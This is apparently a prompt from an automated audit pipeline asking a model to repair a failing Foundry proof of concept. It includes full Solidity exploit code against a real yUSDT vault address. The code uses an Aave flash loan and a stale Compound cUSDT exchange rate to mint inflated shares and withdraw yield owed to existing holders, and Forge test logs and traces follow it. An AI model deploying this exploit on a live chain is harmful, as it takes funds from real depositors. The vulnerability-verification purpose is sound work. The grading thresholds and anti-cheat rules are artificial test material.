You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Stale Compound exchange rate lets new deposits mint inflated shares and steal accrued yield
- claim: Pool accounting prices cUSDT with `exchangeRateStored()` instead of an interest-accruing current rate. When Compound interest has accrued but the stored rate is stale, `deposit()` computes `pool` too low and mints too many shares to the new depositor. A later Compound interaction refreshes the exchange rate, letting those inflated shares redeem previously accrued yield from existing holders.
- impact: Previously accrued Compound yield can be transferred from incumbent shareholders to a new depositor, causing direct dilution and theft of vault value.
- exploit_paths: ["Vault assets sit in Compound long enough for `exchangeRateStored()` to lag the real exchange rate.", "Attacker calls `deposit(_amount)` while `pool` is understated and receives excess shares.", "Attacker or any later interaction touches Compound and refreshes the exchange rate.", "Those excess shares can then be withdrawn for more USDT than the attacker contributed."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IyUSDT is IERC20 {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function totalSupply() external view returns (uint256);
    function token() external view returns (address);
    function compound() external view returns (address);
    function provider() external view returns (uint8);
    function calcPoolValueInToken() external view returns (uint256);
    function balanceCompound() external view returns (uint256);
    function balance() external view returns (uint256);
}

interface ICERC20 {
    function exchangeRateStored() external view returns (uint256);
    function exchangeRateCurrent() external returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function totalReserves() external view returns (uint256);
    function reserveFactorMantissa() external view returns (uint256);
    function borrowRatePerBlock() external view returns (uint256);
    function accrualBlockNumber() external view returns (uint256);
    function getCash() external view returns (uint256);
}

interface IAaveV2LendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IAaveV2FlashLoanReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

contract FlawVerifier is IAaveV2FlashLoanReceiver {
    address public constant VAULT = 0x83f798e925BcD4017Eb265844FDDAbb448f1707D;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant CUSDT = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;
    address public constant AAVE_V2_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;

    uint8 internal constant PROVIDER_COMPOUND = 2;
    uint256 internal constant WAD = 1e18;
    uint256 internal constant AAVE_FLASH_FEE_BPS = 9;
    uint256 internal constant BPS_DENOMINATOR = 10_000;

    uint256 internal _profitAmount;
    bool public hypothesisValidated;
    bool public usedFlashLoan;

    enum Status {
        NotRun,
        Success,
        NotCompoundProvider,
        NoCompoundPosition,
        NoStaleDelta,
        DirectAttemptReturnedNoProfit,
        FlashLoanEconomicallyInfeasible,
        FlashLoanReturnedNoProfit
    }

    Status public status;

    constructor() {}

    function executeOnOpportunity() external {
        if (status == Status.Success) {
            return;
        }

        IyUSDT vault = IyUSDT(VAULT);
        // Path stage 1 requires the vault's assets to actually be sitting in Compound.
        if (vault.provider() != PROVIDER_COMPOUND) {
            status = Status.NotCompoundProvider;
            hypothesisValidated = false;
            return;
        }

        uint256 cBalance = vault.balanceCompound();
        if (cBalance == 0) {
            status = Status.NoCompoundPosition;
            hypothesisValidated = false;
            return;
        }

        uint256 stalePool = vault.calcPoolValueInToken();
        uint256 staleRate = ICERC20(CUSDT).exchangeRateStored();
        uint256 currentRate = _previewExchangeRateCurrent();
        // If the stored rate already equals the current accrual math at this block, the stale-rate path is absent.
        if (currentRate <= staleRate) {
            status = Status.NoStaleDelta;
            hypothesisValidated = false;
            return;
        }

        uint256 deltaUnderlying = (cBalance * (currentRate - staleRate)) / WAD;
        uint256 directCapital = IERC20(USDT).balanceOf(address(this));
        if (_expectedProfit(directCapital, stalePool, deltaUnderlying) > 0) {
            _runDirect(directCapital);
            if (_profitAmount > 0) {
                status = Status.Success;
                hypothesisValidated = true;
                return;
            }
            status = Status.DirectAttemptReturnedNoProfit;
            hypothesisValidated = false;
            return;
        }

        uint256 optimalFlash = _optimalFlashAmount(stalePool, deltaUnderlying);
        // If the entire stale delta is too small relative to flash-loan fees, temporary capital cannot make this fork profitable.
        if (optimalFlash == 0) {
            status = Status.FlashLoanEconomicallyInfeasible;
            hypothesisValidated = false;
            return;
        }

        usedFlashLoan = true;
        address[] memory assets = new address[](1);
        assets[0] = USDT;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = optimalFlash;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        IAaveV2LendingPool(AAVE_V2_POOL).flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            bytes(""),
            0
        );

        if (_profitAmount > 0) {
            status = Status.Success;
            hypothesisValidated = true;
        } else {
            status = Status.FlashLoanReturnedNoProfit;
            hypothesisValidated = false;
        }
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata
    ) external override returns (bool) {
        require(msg.sender == AAVE_V2_POOL, "unexpected lender");
        require(initiator == address(this), "unexpected initiator");
        require(assets.length == 1 && assets[0] == USDT, "unexpected asset");

        uint256 startingBalance = IERC20(USDT).balanceOf(address(this));
        _runExploitPath(amounts[0]);

        uint256 owed = amounts[0] + premiums[0];
        require(IERC20(USDT).balanceOf(address(this)) >= owed, "insufficient repayment");
        _setUSDTApproval(AAVE_V2_POOL, owed);

        uint256 endingBalance = IERC20(USDT).balanceOf(address(this));
        if (endingBalance > startingBalance + premiums[0]) {
            _profitAmount += endingBalance - startingBalance - premiums[0];
        }
        return true;
    }

    function profitToken() external pure returns (address) {
        return USDT;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function previewStaleDelta() external view returns (uint256) {
        uint256 staleRate = ICERC20(CUSDT).exchangeRateStored();
        uint256 currentRate = _previewExchangeRateCurrent();
        if (currentRate <= staleRate) {
            return 0;
        }
        return (IyUSDT(VAULT).balanceCompound() * (currentRate - staleRate)) / WAD;
    }

    function previewFlashAmount() external view returns (uint256) {
        uint256 staleRate = ICERC20(CUSDT).exchangeRateStored();
        uint256 currentRate = _previewExchangeRateCurrent();
        if (currentRate <= staleRate) {
            return 0;
        }
        uint256 deltaUnderlying = (IyUSDT(VAULT).balanceCompound() * (currentRate - staleRate)) / WAD;
        return _optimalFlashAmount(IyUSDT(VAULT).calcPoolValueInToken(), deltaUnderlying);
    }

    function _runDirect(uint256 capital) internal {
        uint256 startBalance = IERC20(USDT).balanceOf(address(this));
        _runExploitPath(capital);
        uint256 endBalance = IERC20(USDT).balanceOf(address(this));
        if (endBalance > startBalance) {
            _profitAmount += endBalance - startBalance;
        }
    }

    function _runExploitPath(uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        // Path stage 2: deposit while the vault still values cUSDT via exchangeRateStored().
        _setUSDTApproval(VAULT, amount);
        IyUSDT(VAULT).deposit(amount);

        uint256 shares = IERC20(VAULT).balanceOf(address(this));

        // Path stage 3: a public Compound interaction refreshes the stored exchange rate.
        ICERC20(CUSDT).exchangeRateCurrent();

        // Path stage 4: withdraw inflated shares after the refreshed valuation lands in pool accounting.
        IyUSDT(VAULT).withdraw(shares);
    }

    function _setUSDTApproval(address spender, uint256 amount) internal {
        IERC20 token = IERC20(USDT);
        token.approve(spender, 0);
        token.approve(spender, amount);
    }

    function _previewExchangeRateCurrent() internal view returns (uint256) {
        ICERC20 c = ICERC20(CUSDT);
        uint256 accrualBlock = c.accrualBlockNumber();
        if (accrualBlock == block.number) {
            return c.exchangeRateStored();
        }

        uint256 blockDelta = block.number - accrualBlock;
        uint256 borrowRate = c.borrowRatePerBlock();
        uint256 borrowsPrior = c.totalBorrows();
        uint256 reservesPrior = c.totalReserves();
        uint256 reserveFactor = c.reserveFactorMantissa();
        uint256 totalSupply = c.totalSupply();
        uint256 cash = c.getCash();

        uint256 simpleInterestFactor = borrowRate * blockDelta;
        uint256 interestAccumulated = (simpleInterestFactor * borrowsPrior) / WAD;
        uint256 totalBorrowsNew = borrowsPrior + interestAccumulated;
        uint256 totalReservesNew = reservesPrior + ((reserveFactor * interestAccumulated) / WAD);

        return ((cash + totalBorrowsNew - totalReservesNew) * WAD) / totalSupply;
    }

    function _optimalFlashAmount(uint256 stalePool, uint256 deltaUnderlying) internal pure returns (uint256) {
        // Profit(A) = A * delta / (pool + A) - fee * A.
        // If delta / pool <= fee, no flash-funded size can produce positive net profit.
        if (stalePool == 0 || deltaUnderlying == 0) {
            return 0;
        }

        if (deltaUnderlying * BPS_DENOMINATOR <= stalePool * AAVE_FLASH_FEE_BPS) {
            return 0;
        }

        uint256 fee = (AAVE_FLASH_FEE_BPS * WAD) / BPS_DENOMINATOR;
        uint256 radicand = (deltaUnderlying * stalePool * WAD) / fee;
        uint256 root = _sqrt(radicand);
        if (root <= stalePool) {
            return 0;
        }

        return root - stalePool;
    }

    function _expectedProfit(uint256 amount, uint256 stalePool, uint256 deltaUnderlying) internal pure returns (uint256) {
        if (amount == 0 || deltaUnderlying == 0) {
            return 0;
        }
        return (amount * deltaUnderlying) / (stalePool + amount);
    }

    function _sqrt(uint256 x) internal pure returns (uint256 z) {
        if (x == 0) {
            return 0;
        }
        uint256 y = x;
        z = (x + 1) / 2;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
        return y;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.44s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 73635)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xdAC17F958D2ee523a2206206994597C13D831ec7
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 11075

Traces:
  [73635] FlawVerifierTest::testExploit()
    ├─ [284] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xdAC17F958D2ee523a2206206994597C13D831ec7
    ├─ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [28154] FlawVerifier::executeOnOpportunity()
    │   ├─ [2723] 0x83f798e925BcD4017Eb265844FDDAbb448f1707D::provider() [staticcall]
    │   │   └─ ← [Return] 3
    │   └─ ← [Stop]
    ├─ [284] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xdAC17F958D2ee523a2206206994597C13D831ec7
    ├─ [2401] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xdAC17F958D2ee523a2206206994597C13D831ec7)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 17036774 [1.703e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 11075 [1.107e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.70s (766.32ms CPU time)

Ran 1 test suite in 1.71s (1.70s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 73635)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
